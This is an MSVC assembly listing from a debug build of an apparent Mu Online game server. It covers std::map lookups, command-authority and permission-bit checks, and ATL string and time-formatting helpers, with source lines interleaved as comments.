?find@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@ABK@Z PROC ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::find, COMDAT
; _this$ = ecx

; 1467 :     _NODISCARD iterator find(const key_type& _Keyval) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1468 :         return iterator(_Find(_Keyval), _Get_scary());

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IAEPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Get_scary
  00014	50		 push	 eax
  00015	8b 45 0c	 mov	 eax, DWORD PTR __Keyval$[ebp]
  00018	50		 push	 eax
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	e8 00 00 00 00	 call	 ??$_Find@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@ABEPAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@ABK@Z ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Find<unsigned long>
  00021	50		 push	 eax
  00022	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00025	e8 00 00 00 00	 call	 ??0?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z
  0002a	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 1469 :     }

  0002d	5f		 pop	 edi
  0002e	5e		 pop	 esi
  0002f	5b		 pop	 ebx
  00030	8b e5		 mov	 esp, ebp
  00032	5d		 pop	 ebp
  00033	c2 08 00	 ret	 8
?find@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@ABK@Z ENDP ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::find
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ?end@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@XZ
_TEXT	SEGMENT
__Scary$ = -8						; size = 4
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
?end@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@XZ PROC ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::end, COMDAT
; _this$ = ecx

; 1248 :     _NODISCARD iterator end() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1249 :         const auto _Scary = _Get_scary();

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IAEPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Get_scary
  00014	89 45 f8	 mov	 DWORD PTR __Scary$[ebp], eax

; 1250 :         return iterator(_Scary->_Myhead, _Scary);

  00017	8b 45 f8	 mov	 eax, DWORD PTR __Scary$[ebp]
  0001a	50		 push	 eax
  0001b	8b 4d f8	 mov	 ecx, DWORD PTR __Scary$[ebp]
  0001e	8b 11		 mov	 edx, DWORD PTR [ecx]
  00020	52		 push	 edx
  00021	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00024	e8 00 00 00 00	 call	 ??0?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z
  00029	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 1251 :     }

  0002c	5f		 pop	 edi
  0002d	5e		 pop	 esi
  0002e	5b		 pop	 ebx
  0002f	8b e5		 mov	 esp, ebp
  00031	5d		 pop	 ebp
  00032	c2 04 00	 ret	 4
?end@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@XZ ENDP ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::end
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\Global.h
;	COMDAT ?GetCommandAuthority@CGlobalConfig@@QAEKK@Z
_TEXT	SEGMENT
$T1 = -72						; size = 4
_this$ = -4						; size = 4
_command_code$ = 8					; size = 4
?GetCommandAuthority@CGlobalConfig@@QAEKK@Z PROC	; CGlobalConfig::GetCommandAuthority, COMDAT
; _this$ = ecx

; 22   : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 23   : 		return this->m_mAuthorityCode.find(command_code)->second;

  0000c	8d 45 08	 lea	 eax, DWORD PTR _command_code$[ebp]
  0000f	50		 push	 eax
  00010	8d 4d b8	 lea	 ecx, DWORD PTR $T1[ebp]
  00013	51		 push	 ecx
  00014	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00017	81 c1 a0 05 00
	00		 add	 ecx, 1440		; 000005a0H
  0001d	e8 00 00 00 00	 call	 ?find@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@ABK@Z ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::find
  00022	8b c8		 mov	 ecx, eax
  00024	e8 00 00 00 00	 call	 ??C?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEPAU?$pair@$$CBKK@1@XZ ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator->
  00029	8b 40 04	 mov	 eax, DWORD PTR [eax+4]

; 24   : 	}

  0002c	5f		 pop	 edi
  0002d	5e		 pop	 esi
  0002e	5b		 pop	 ebx
  0002f	8b e5		 mov	 esp, ebp
  00031	5d		 pop	 ebp
  00032	c2 04 00	 ret	 4
?GetCommandAuthority@CGlobalConfig@@QAEKK@Z ENDP	; CGlobalConfig::GetCommandAuthority
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\Global.h
;	COMDAT ?CheckCommand@CGlobalConfig@@QAE_NK@Z
_TEXT	SEGMENT
$T1 = -76						; size = 4
$T2 = -72						; size = 4
_this$ = -4						; size = 4
_command_code$ = 8					; size = 4
?CheckCommand@CGlobalConfig@@QAE_NK@Z PROC		; CGlobalConfig::CheckCommand, COMDAT
; _this$ = ecx

; 17   : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 4c	 sub	 esp, 76			; 0000004cH
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 18   : 		return (this->m_mAuthorityCode.find(command_code) != this->m_mAuthorityCode.end());

  0000c	8d 45 b4	 lea	 eax, DWORD PTR $T1[ebp]
  0000f	50		 push	 eax
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	81 c1 a0 05 00
	00		 add	 ecx, 1440		; 000005a0H
  00019	e8 00 00 00 00	 call	 ?end@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::end
  0001e	50		 push	 eax
  0001f	8d 4d 08	 lea	 ecx, DWORD PTR _command_code$[ebp]
  00022	51		 push	 ecx
  00023	8d 55 b8	 lea	 edx, DWORD PTR $T2[ebp]
  00026	52		 push	 edx
  00027	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002a	81 c1 a0 05 00
	00		 add	 ecx, 1440		; 000005a0H
  00030	e8 00 00 00 00	 call	 ?find@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@ABK@Z ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::find
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ??9?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBE_NABV01@@Z ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator!=

; 19   : 	}

  0003c	5f		 pop	 edi
  0003d	5e		 pop	 esi
  0003e	5b		 pop	 ebx
  0003f	8b e5		 mov	 esp, ebp
  00041	5d		 pop	 ebp
  00042	c2 04 00	 ret	 4
?CheckCommand@CGlobalConfig@@QAE_NK@Z ENDP		; CGlobalConfig::CheckCommand
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\user.h
;	COMDAT ?CheckAuthority@@YA_NKPAVOBJECTSTRUCT@@@Z
_TEXT	SEGMENT
tv69 = -66						; size = 1
tv71 = -65						; size = 1
_dwComposeAuthority$ = 8				; size = 4
_pMyObject$ = 12					; size = 4
?CheckAuthority@@YA_NKPAVOBJECTSTRUCT@@@Z PROC		; CheckAuthority, COMDAT

; 1646 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 1647 : 	return ((pMyObject->Authority & AUTHORITY_DISABLE) ? false : ((pMyObject->Authority & dwComposeAuthority) ? true : false));

  00009	8b 45 0c	 mov	 eax, DWORD PTR _pMyObject$[ebp]
  0000c	8b 88 a4 01 00
	00		 mov	 ecx, DWORD PTR [eax+420]
  00012	81 e1 80 00 00
	00		 and	 ecx, 128		; 00000080H
  00018	74 06		 je	 SHORT $LN5@CheckAutho
  0001a	c6 45 bf 00	 mov	 BYTE PTR tv71[ebp], 0
  0001e	eb 1e		 jmp	 SHORT $LN6@CheckAutho
$LN5@CheckAutho:
  00020	8b 55 0c	 mov	 edx, DWORD PTR _pMyObject$[ebp]
  00023	8b 82 a4 01 00
	00		 mov	 eax, DWORD PTR [edx+420]
  00029	23 45 08	 and	 eax, DWORD PTR _dwComposeAuthority$[ebp]
  0002c	74 06		 je	 SHORT $LN3@CheckAutho
  0002e	c6 45 be 01	 mov	 BYTE PTR tv69[ebp], 1
  00032	eb 04		 jmp	 SHORT $LN4@CheckAutho
$LN3@CheckAutho:
  00034	c6 45 be 00	 mov	 BYTE PTR tv69[ebp], 0
$LN4@CheckAutho:
  00038	8a 4d be	 mov	 cl, BYTE PTR tv69[ebp]
  0003b	88 4d bf	 mov	 BYTE PTR tv71[ebp], cl
$LN6@CheckAutho:
  0003e	8a 45 bf	 mov	 al, BYTE PTR tv71[ebp]

; 1648 : 	//return(((pMyObject->Authority & dwComposeAuthority) == pMyObject->Authority)? true : false);
; 1649 : }

  00041	5f		 pop	 edi
  00042	5e		 pop	 esi
  00043	5b		 pop	 ebx
  00044	8b e5		 mov	 esp, ebp
  00046	5d		 pop	 ebp
  00047	c3		 ret	 0
?CheckAuthority@@YA_NKPAVOBJECTSTRUCT@@@Z ENDP		; CheckAuthority
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xmemory
;	COMDAT ?_Adopt@_Iterator_base0@std@@QAEXPBX@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 4
?_Adopt@_Iterator_base0@std@@QAEXPBX@Z PROC		; std::_Iterator_base0::_Adopt, COMDAT
; _this$ = ecx

; 1072 :     void _Adopt(const void*) noexcept {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  0000c	5f		 pop	 edi
  0000d	5e		 pop	 esi
  0000e	5b		 pop	 ebx
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c2 04 00	 ret	 4
?_Adopt@_Iterator_base0@std@@QAEXPBX@Z ENDP		; std::_Iterator_base0::_Adopt
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\afxstr.h
;	COMDAT ?GetDefaultManager@?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@SAPAUIAtlStringMgr@ATL@@XZ
_TEXT	SEGMENT
?GetDefaultManager@?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@SAPAUIAtlStringMgr@ATL@@XZ PROC ; StrTraitMFC<char,ATL::ChTraitsCRT<char> >::GetDefaultManager, COMDAT

; 51   : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 52   : 		return( AfxGetStringManager() );

  00009	e8 00 00 00 00	 call	 ?AfxGetStringManager@@YGPAUIAtlStringMgr@ATL@@XZ ; AfxGetStringManager

; 53   : 	}

  0000e	5f		 pop	 edi
  0000f	5e		 pop	 esi
  00010	5b		 pop	 ebx
  00011	8b e5		 mov	 esp, ebp
  00013	5d		 pop	 ebp
  00014	c3		 ret	 0
?GetDefaultManager@?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@SAPAUIAtlStringMgr@ATL@@XZ ENDP ; StrTraitMFC<char,ATL::ChTraitsCRT<char> >::GetDefaultManager
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\afxstr.h
;	COMDAT ?FindStringResourceInstance@?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@SAPAUHINSTANCE__@@I@Z
_TEXT	SEGMENT
_nID$ = 8						; size = 4
?FindStringResourceInstance@?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@SAPAUHINSTANCE__@@I@Z PROC ; StrTraitMFC<char,ATL::ChTraitsCRT<char> >::FindStringResourceInstance, COMDAT

; 46   : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 47   : 		return( AfxFindStringResourceHandle( nID ) );

  00009	8b 45 08	 mov	 eax, DWORD PTR _nID$[ebp]
  0000c	50		 push	 eax
  0000d	e8 00 00 00 00	 call	 ?AfxFindStringResourceHandle@@YGPAUHINSTANCE__@@I@Z ; AfxFindStringResourceHandle

; 48   : 	}

  00012	5f		 pop	 edi
  00013	5e		 pop	 esi
  00014	5b		 pop	 ebx
  00015	8b e5		 mov	 esp, ebp
  00017	5d		 pop	 ebp
  00018	c3		 ret	 0
?FindStringResourceInstance@?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@SAPAUHINSTANCE__@@I@Z ENDP ; StrTraitMFC<char,ATL::ChTraitsCRT<char> >::FindStringResourceInstance
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\cstringt.h
;	COMDAT ?ConvertToBaseType@?$ChTraitsCRT@D@ATL@@SAXPADHPB_WH@Z
_TEXT	SEGMENT
_pszDest$ = 8						; size = 4
_nDestLength$ = 12					; size = 4
_pszSrc$ = 16						; size = 4
_nSrcLength$ = 20					; size = 4
?ConvertToBaseType@?$ChTraitsCRT@D@ATL@@SAXPADHPB_WH@Z PROC ; ATL::ChTraitsCRT<char>::ConvertToBaseType, COMDAT

; 362  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 363  : 		// nLen is in XCHARs
; 364  : 		::WideCharToMultiByte( _AtlGetConversionACP(), 0, pszSrc, nSrcLength, pszDest, nDestLength, NULL, NULL );

  00009	6a 00		 push	 0
  0000b	6a 00		 push	 0
  0000d	8b 45 0c	 mov	 eax, DWORD PTR _nDestLength$[ebp]
  00010	50		 push	 eax
  00011	8b 4d 08	 mov	 ecx, DWORD PTR _pszDest$[ebp]
  00014	51		 push	 ecx
  00015	8b 55 14	 mov	 edx, DWORD PTR _nSrcLength$[ebp]
  00018	52		 push	 edx
  00019	8b 45 10	 mov	 eax, DWORD PTR _pszSrc$[ebp]
  0001c	50		 push	 eax
  0001d	6a 00		 push	 0
  0001f	e8 00 00 00 00	 call	 ?_AtlGetConversionACP@ATL@@YGIXZ ; ATL::_AtlGetConversionACP
  00024	50		 push	 eax
  00025	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__WideCharToMultiByte@32

; 365  : 	}

  0002b	5f		 pop	 edi
  0002c	5e		 pop	 esi
  0002d	5b		 pop	 ebx
  0002e	8b e5		 mov	 esp, ebp
  00030	5d		 pop	 ebp
  00031	c3		 ret	 0
?ConvertToBaseType@?$ChTraitsCRT@D@ATL@@SAXPADHPB_WH@Z ENDP ; ATL::ChTraitsCRT<char>::ConvertToBaseType
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\cstringt.h
;	COMDAT ?GetBaseTypeLength@?$ChTraitsCRT@D@ATL@@SAHPB_WH@Z
_TEXT	SEGMENT
_pszSource$ = 8						; size = 4
_nLength$ = 12						; size = 4
?GetBaseTypeLength@?$ChTraitsCRT@D@ATL@@SAHPB_WH@Z PROC	; ATL::ChTraitsCRT<char>::GetBaseTypeLength, COMDAT

; 340  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 341  : 		// Returns required buffer length in XCHARs
; 342  : 		return ::WideCharToMultiByte( _AtlGetConversionACP(), 0, pszSource, nLength, NULL, 0, NULL, NULL );

  00009	6a 00		 push	 0
  0000b	6a 00		 push	 0
  0000d	6a 00		 push	 0
  0000f	6a 00		 push	 0
  00011	8b 45 0c	 mov	 eax, DWORD PTR _nLength$[ebp]
  00014	50		 push	 eax
  00015	8b 4d 08	 mov	 ecx, DWORD PTR _pszSource$[ebp]
  00018	51		 push	 ecx
  00019	6a 00		 push	 0
  0001b	e8 00 00 00 00	 call	 ?_AtlGetConversionACP@ATL@@YGIXZ ; ATL::_AtlGetConversionACP
  00020	50		 push	 eax
  00021	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__WideCharToMultiByte@32

; 343  : 	}

  00027	5f		 pop	 edi
  00028	5e		 pop	 esi
  00029	5b		 pop	 ebx
  0002a	8b e5		 mov	 esp, ebp
  0002c	5d		 pop	 ebp
  0002d	c3		 ret	 0
?GetBaseTypeLength@?$ChTraitsCRT@D@ATL@@SAHPB_WH@Z ENDP	; ATL::ChTraitsCRT<char>::GetBaseTypeLength
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atltime.h
;	COMDAT ?Format@CTime@ATL@@QBE?AV?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@2@PBD@Z
_TEXT	SEGMENT
$T1 = -244						; size = 4
$T2 = -240						; size = 4
_ptmTemp$ = -172					; size = 36
_szBuffer$ = -136					; size = 128
_this$ = -8						; size = 4
__$ArrayPad$ = -4					; size = 4
___$ReturnUdt$ = 8					; size = 4
_pFormat$ = 12						; size = 4
?Format@CTime@ATL@@QBE?AV?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@2@PBD@Z PROC ; ATL::CTime::Format, COMDAT
; _this$ = ecx

; 1057 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec f4 00 00
	00		 sub	 esp, 244		; 000000f4H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00013	53		 push	 ebx
  00014	56		 push	 esi
  00015	57		 push	 edi
  00016	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00019	c7 85 0c ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T1[ebp], 0

; 1058 : 	if(pFormat == NULL)

  00023	83 7d 0c 00	 cmp	 DWORD PTR _pFormat$[ebp], 0
  00027	75 23		 jne	 SHORT $LN2@Format

; 1059 : 	{
; 1060 : 		return pFormat;

  00029	8b 45 0c	 mov	 eax, DWORD PTR _pFormat$[ebp]
  0002c	50		 push	 eax
  0002d	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00030	e8 00 00 00 00	 call	 ??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >
  00035	8b 8d 0c ff ff
	ff		 mov	 ecx, DWORD PTR $T1[ebp]
  0003b	83 c9 01	 or	 ecx, 1
  0003e	89 8d 0c ff ff
	ff		 mov	 DWORD PTR $T1[ebp], ecx
  00044	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  00047	e9 94 00 00 00	 jmp	 $LN5@Format
$LN2@Format:

; 1061 : 	}
; 1062 : 
; 1063 : 	TCHAR szBuffer[maxTimeBufferSize];
; 1064 : 	struct tm ptmTemp;
; 1065 : 
; 1066 : 	if (_localtime64_s(&ptmTemp, &m_time) != 0)

  0004c	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0004f	50		 push	 eax
  00050	8d 8d 54 ff ff
	ff		 lea	 ecx, DWORD PTR _ptmTemp$[ebp]
  00056	51		 push	 ecx
  00057	e8 00 00 00 00	 call	 __localtime64_s
  0005c	83 c4 08	 add	 esp, 8
  0005f	85 c0		 test	 eax, eax
  00061	74 0a		 je	 SHORT $LN3@Format

; 1067 : 	{
; 1068 : 		AtlThrow(E_INVALIDARG);

  00063	68 57 00 07 80	 push	 -2147024809		; 80070057H
  00068	e8 00 00 00 00	 call	 ?AtlThrowImpl@ATL@@YGXJ@Z ; ATL::AtlThrowImpl
$LN3@Format:

; 1069 : 	}
; 1070 : 
; 1071 : 	if (!_tcsftime(szBuffer, maxTimeBufferSize, pFormat, &ptmTemp))

  0006d	8d 85 54 ff ff
	ff		 lea	 eax, DWORD PTR _ptmTemp$[ebp]
  00073	50		 push	 eax
  00074	8b 4d 0c	 mov	 ecx, DWORD PTR _pFormat$[ebp]
  00077	51		 push	 ecx
  00078	68 80 00 00 00	 push	 128			; 00000080H
  0007d	8d 95 78 ff ff
	ff		 lea	 edx, DWORD PTR _szBuffer$[ebp]
  00083	52		 push	 edx
  00084	e8 00 00 00 00	 call	 _strftime
  00089	83 c4 10	 add	 esp, 16			; 00000010H
  0008c	85 c0		 test	 eax, eax
  0008e	75 2f		 jne	 SHORT $LN4@Format

; 1072 : 	{
; 1073 : 		szBuffer[0] = '\0';

  00090	b8 01 00 00 00	 mov	 eax, 1
  00095	6b c8 00	 imul	 ecx, eax, 0
  00098	89 8d 10 ff ff
	ff		 mov	 DWORD PTR $T2[ebp], ecx
  0009e	81 bd 10 ff ff
	ff 80 00 00 00	 cmp	 DWORD PTR $T2[ebp], 128	; 00000080H
  000a8	73 02		 jae	 SHORT $LN6@Format
  000aa	eb 05		 jmp	 SHORT $LN7@Format
$LN6@Format:
  000ac	e8 00 00 00 00	 call	 ___report_rangecheckfailure
$LN7@Format:
  000b1	8b 95 10 ff ff
	ff		 mov	 edx, DWORD PTR $T2[ebp]
  000b7	c6 84 15 78 ff
	ff ff 00	 mov	 BYTE PTR _szBuffer$[ebp+edx], 0
$LN4@Format:

; 1074 : 	}
; 1075 : 
; 1076 : 	return szBuffer;

  000bf	8d 85 78 ff ff
	ff		 lea	 eax, DWORD PTR _szBuffer$[ebp]
  000c5	50		 push	 eax
  000c6	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  000c9	e8 00 00 00 00	 call	 ??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >
  000ce	8b 8d 0c ff ff
	ff		 mov	 ecx, DWORD PTR $T1[ebp]
  000d4	83 c9 01	 or	 ecx, 1
  000d7	89 8d 0c ff ff
	ff		 mov	 DWORD PTR $T1[ebp], ecx
  000dd	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
$LN5@Format:

; 1077 : }

  000e0	5f		 pop	 edi
  000e1	5e		 pop	 esi
  000e2	5b		 pop	 ebx
  000e3	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  000e6	33 cd		 xor	 ecx, ebp
  000e8	e8 00 00 00 00	 call	 @__security_check_cookie@4
  000ed	8b e5		 mov	 esp, ebp
  000ef	5d		 pop	 ebp
  000f0	c2 08 00	 ret	 8
?Format@CTime@ATL@@QBE?AV?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@2@PBD@Z ENDP ; ATL::CTime::Format
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
